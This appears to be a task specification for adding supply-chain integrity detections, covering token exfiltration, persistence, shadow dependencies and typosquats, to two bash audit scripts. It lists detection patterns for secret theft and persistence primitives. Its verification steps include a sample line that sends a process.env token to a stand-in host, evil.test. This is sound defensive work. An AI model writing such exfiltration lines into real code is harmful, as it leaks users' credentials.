---
id: route-180
title: Implement missing deterministic integrity detections (exfiltration, persistence, shadow-deps, real typosquat)
task_type: bash-script-feature
milestone: M64
complexity: high
executor: copilot
context_required:
  - skills/scripts.md
  - wiki/integrity-rules.md
  - reports/audit-070-m55-m58-gateway-deep-dive.md
files_affected:
  - agent/scripts/acp.network-whitelist-validate.sh
  - agent/scripts/acp.dependency-diff.sh
tokens_est: 14000
tokens_actual:
cost_est_usd:
cost_actual_usd:
created: 2026-06-15
started:
completed:
override_reason:
---

## Objective

Close the biggest part of the "claimed >> implemented" gap (F-070-02) by implementing the high-value deterministic rules that currently have NO detection: the CRITICAL exfiltration category (IG-07–IG-13), the persistence/execution category (IG-21–IG-26), IG-04/IG-05, plus the dependency rules the script claims but does not do — IG-29 (shadow deps), real IG-27 typosquatting, and IG-32.

Any rule that genuinely cannot be made deterministic in bash is explicitly NOT implemented here — it is handed to route-181 to be relabelled honestly ("documented, not enforced"). The deliverable is: **every rule listed as script-backed after this milestone actually runs.**

## Context

audit-070 F-070-02 (HIGH): `acp.network-whitelist-validate.sh` implements only IG-01/02/03/06; whole CRITICAL categories (exfiltration IG-07–13, persistence IG-21–26) and IG-04/05 silently pass. F-070-08 (MED): `acp.dependency-diff.sh` claims "Levenshtein 1–2 from top-1000" but does a crude substring match over ~60 hardcoded packages; IG-29 (its namesake "shadow dependency" check) and IG-32 are missing.

These are exactly the patterns supply-chain/insider attacks use, so they are the highest-value detections to add.

## Steps

### Part A — network-whitelist-validate.sh: exfiltration + persistence (heuristic, line/scope-based)
Implement as grep/awk heuristics with documented confidence (deterministic pattern match = HIGH confidence per skill ceilings; multi-line data-flow is approximate — note that in output). For each, emit the uniform finding format (see route-182):
1. **IG-04** — `eval(` applied to fetched content: line contains both `eval(` and a network identifier (`fetch`/`axios`/`http`).
2. **IG-05** — DNS lookup (`dns.lookup`/`dns.resolve`/`resolve4`) with an argument referencing `process.env`.
3. **IG-07** — `process.env.X` and a network call within the same function/scope window (use a sliding window of N lines or brace-tracked scope; document the window).
4. **IG-08** — `fs.readFile`/`readFileSync` result feeding a network call in the same scope window.
5. **IG-09** — clipboard read (`navigator.clipboard.readText`, `clipboardy`) → network in scope.
6. **IG-10** — storage read (`localStorage`/`AsyncStorage`/`SecureStore` get) → network in scope (HIGH per catalogue).
7. **IG-11** — auth-token-looking identifiers (`token`, `authorization`, `apikey`) interpolated into a URL/query string or `console.log`.
8. **IG-12** — request body containing PII-keyword fields (`ssn`,`dob`,`creditcard`) without an encryption wrapper call nearby.
9. **IG-13** — screenshot APIs (`captureScreen`,`html2canvas`,`takeScreenshot`) present (flag for context review).
10. **IG-21** — `child_process.exec(`/`execSync(` with a non-string-literal (dynamic) argument.
11. **IG-22** — `fs.writeFile`/`writeFileSync` to a system path (`/etc/`, `/usr/`, `C:\\Windows`, `~/.ssh`).
12. **IG-23** — cron/scheduled task creation (`node-cron`, `crontab`, `schtasks`).
13. **IG-24** — self-modifying code (`fs.writeFile` targeting `__filename` or the script's own path).
14. **IG-25** — dynamic `require(`/`import(` whose argument references `process.env` or a function parameter.
15. **IG-26** — process injection primitives (`process.binding`, `--inspect` spawned, `ptrace`).
> Implement scope-window detection as a small reusable bash/awk helper. Document the heuristic window in the script header and mark these findings `confidence: HIGH (pattern) / scope-approximate` so route-181's coverage table is accurate.

### Part B — dependency-diff.sh: IG-29 shadow deps + real IG-27 + IG-32
1. **IG-29** — parse imported package names from source (`import ... from 'x'` / `require('x')`, strip subpaths/scopes) via a Python helper; parse installed packages from the lockfile; flag any imported package absent from the lockfile.
2. **IG-27** — replace the substring hack with a real **Levenshtein distance ≤2** check (Python helper) of each dependency name against the top-package list; expand the list (load from a data file `agent/wiki/top-npm-packages.txt` if present, else the inline list). Exclude exact matches and legitimate scoped/`-` suffixes.
3. **IG-32** — new dependency added in the working tree (`git diff` on `package.json` dependencies) without a `route-`/`task-`/`M\d+` reference in the staged commit message or recent log.
4. Route all package.json/lockfile parsing through Python `json`/the yaml-parser — never grep (coordinate with route-183/F-070-09).

## Expected Output

### Files Modified
- `agent/scripts/acp.network-whitelist-validate.sh` — IG-04/05/07–13/21–26 detections
- `agent/scripts/acp.dependency-diff.sh` — IG-29, real IG-27 (Levenshtein), IG-32

### Files Created (optional)
- `agent/wiki/top-npm-packages.txt` — typosquat reference list (if extracted from inline)

## Verification (double-verify)

- [ ] **Automated**: route-184 fixtures include a true-positive + true-negative for each newly-implemented rule; all pass
- [ ] **Manual**: a crafted `exfil.ts` (`const t = process.env.TOKEN; fetch('https://evil.test/?d='+t)`) yields IG-07 + IG-01; a clean file yields nothing
- [ ] **Manual**: a `package.json` importing an un-locked package yields IG-29; `expresss` yields IG-27
- [ ] No new false positives on the ACP clean codebase (route-184 baseline stays at 0 CRITICAL/HIGH)
- [ ] `shellcheck --severity=error` clean

## User-Observable Acceptance

- `/acp-integrity` actually flags hardcoded-token exfiltration, dynamic `exec`, shadow dependencies, and typosquats — not just non-whitelisted URLs.

## Addresses

audit-070 F-070-02 (HIGH, implementation side), F-070-08 (MED)
